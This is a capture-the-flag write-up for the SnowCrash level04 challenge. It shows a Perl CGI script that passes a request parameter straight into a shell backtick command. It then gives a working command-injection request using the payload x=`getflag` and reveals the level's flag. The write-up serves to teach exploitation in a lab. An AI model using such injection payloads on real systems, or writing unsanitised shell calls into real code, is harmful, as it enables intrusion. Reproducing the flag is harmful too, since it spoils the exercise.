
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl


that the code in level04.pl 
```
#!/usr/bin/perl
# localhost:4747

use CGI qw{param};

# Set the content type of the response to text/html
print "Content-type: text/html\n\n";

# Define the subroutine x
sub x {
  $y = $_[0];
  # Execute the command "echo $y" and capture the output
  print `echo $y 2>&1`;
}

# Call the subroutine x with the value of the parameter "x" from the request
x(param("x"));
```

after see open port 

ss -a
![ss-command.png](https://i.postimg.cc/FhssNh7r/ss-command.png)


level04@SnowCrash:~$ ss -a
State       Recv-Q Send-Q                                                                                   Local Address:Port                                                                                       Peer Address:Port   
LISTEN      0      128                                                                                                 :::4646                                                                                                 :::*       
LISTEN      0      128                                                                                                 :::4747                                                                                                 :::*       
LISTEN      0      128                                                                                                 :::http                                                                                                 :::*       
LISTEN      0      128                                                                                                 :::4242                                                                                                 :::*       
LISTEN      0      128                                                                                                  *:4242                                                                                                  *:*       
LISTEN      0      32                                                                                           127.0.0.1:pcrd                                                                                                  *:*       
ESTAB       0      0                                                                                         192.168.1.12:4242                                                                                        192.168.1.9:54398 

after testing port 4747 and having a webserver listen to that port we can go know to code and test "x(param("x"));" and try to pass parameter x pass some arg to print `echo $y 2>&1`; 
we can see for example : http://localhost:4747/level04.pl?x=abc the abc output is "abc" .

let to explain 
print `echo $y 2>&1`; 
In the Bash shell, the backtick character (`) is used to perform command substitution. It allows you to execute a command within a command and capture the output of that command.
Alternatively, you can also use the modern syntax $() for command substitution, which provides better readability and can be nested more easily:
that means if we send a request with parameter x=`ls` that "ls" now not an argument for echo is another command.
now let have the flag and go to anther level
we can use : curl 'http://localhost:4747/level04.pl?x=`getflag`'
and the flag is : ne2searoevaevoem4ov4ar8ap
